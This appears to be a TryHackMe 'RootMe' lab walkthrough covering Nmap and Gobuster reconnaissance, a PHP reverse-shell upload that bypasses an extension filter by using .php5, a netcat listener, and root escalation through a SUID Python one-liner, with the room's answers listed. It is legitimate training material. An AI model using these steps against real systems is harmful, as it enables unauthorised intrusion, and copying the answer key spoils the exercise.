# THM RootMe Walkthrough By Tirexv2
![RoomLogo](https://miro.medium.com/max/700/0*4vGBRHcDbSK82n4P.png)

This [Room](https://tryhackme.com/room/rrootme) will help you to practice the usage of `Gobuster` , `Nmap` as tools and `Privilege escalation` , `WebShell` 

## Task 1 Deploy the machine

1- Start Machine

2- Start AttackBox (if you want to use Web GUI) else use OpenVpn

## Task 2 Reconnaissance

1 - We will scan the machine using Nmap 
`nmap -sC -sV Machine IP`

`-sC` refers to Scan using Defaults scripts

`-sV` refers to pull infos of open ports 

![nmap](https://user-images.githubusercontent.com/31727214/212396877-437558c2-1a5f-424f-b2c6-9ca774fbb6bd.PNG)


after this scan you will be able to answer first 3 questions 

```
Scan the machine, how many ports are open? : 2 Ports : 80 & 22

What version of Apache is running? : 2.4.29

What service is running on port 22? : SSH
```

2 - as he said we will use `GoBuster` to discover directories on the web server :

`gobuster dir -u http://10.10.1.130 -w /usr/share/wordlists/dirb/common.txt`

`dir` refers to directory or file for enumeration mode

`-u` refers to URL parameter

`-w` refers path to the wordlist

![image](https://user-images.githubusercontent.com/31727214/212395961-b00f9c07-399d-4af3-a681-12a6830dc910.png)

Now we will be able to answer last Question in this Task 

```
What is the hidden directory? : /panel/
```

## Task 3 Getting a shell

1 - Lets try to browse into the hiden page `http://ip/panel/`

looks like we found something interesting we can upload files so lets try to upload web shell and get a reverse shell to execute commands on the web server

for this step we can use metasploit to generate php reverse shell or we can just take a shell and make some edits so for me i will use [Php reverse shell](php-reverse-shell) from pentestmonkey

but we need to do some edits in the script before uploading on the webserver

![image](https://user-images.githubusercontent.com/31727214/212399261-caeaf4cb-5bd3-4931-ae85-3fd08dcdbd01.png)

```
$ip : Attacker Machine IP
```

but we face an error here because we upoload shell.php file with php extension
![image](https://user-images.githubusercontent.com/31727214/212399901-c3a497df-fbef-4612-9581-91163de18ac3.png)

so let's try to escape this filtre by replacing php with php5 so the new structre of file extension will be like this `shell.php5` instead of `shell.php`

![image](https://user-images.githubusercontent.com/31727214/212400487-4bad41e1-d506-4347-ae15-a867ddc4a216.png)

Now we will execute our shell and start a netcat listener from Attacker Machine 

To start netcat :
`sudo nc -nlvp 9999`

To execute our shell we will use `Curl` command 
`curl hhtp://ip/uploads/shell.php5`

![image](https://user-images.githubusercontent.com/31727214/212401848-6275af69-9ddb-45d0-a634-b790542f7ae7.png)

Our shell executed succefully now we can capture the flag 

As he said we need to search for `user.txt` file so we will use `find` command to execute this search

Command : `find / -type f -name user.txt 2> /dev/null`

We found the Path for `user.txt` so we will use `cat` to print the content of a file

Command : `cat /var/www/user.txt`

![image](https://user-images.githubusercontent.com/31727214/212402497-bcd8d010-6a4e-4e75-bdd7-fa72889ec7ae.png)

## Task 4 Privilege escalation 

as he ask we need to search for files with [SUID](https://www.redhat.com/sysadmin/suid-sgid-sticky-bit) permission to Esclate our privilege we will use `find` again 

Command : `find  / type f -user root -perm -u=s 2>/dev/null` 

we found python with SUID permissions so the first answer is : `/usr/bin/python`

![image](https://user-images.githubusercontent.com/31727214/212406201-dfedd763-6aa7-49d6-8553-0216051f69be.png)

we can execute python script directly to Escalate privilege to root user

Python Script : `python -c ‘import os; os.execl(“/bin/sh”, “sh”, “-p”)’`

let's use `whoami` to test if we obtain root user 

then we will use `find / -type f -name root.txt` to find `root.txt` file 

Finally we will use `cat` to get our Flag `cat /root/root.txt`

![image](https://user-images.githubusercontent.com/31727214/212409198-55f2c438-f8d6-407a-9151-bf15f6b8b777.png)

Will all this steps we finish this room succefully 

![image](https://user-images.githubusercontent.com/31727214/212409814-ca4ba798-7d80-4ce7-8c1a-a514f73d7825.png)



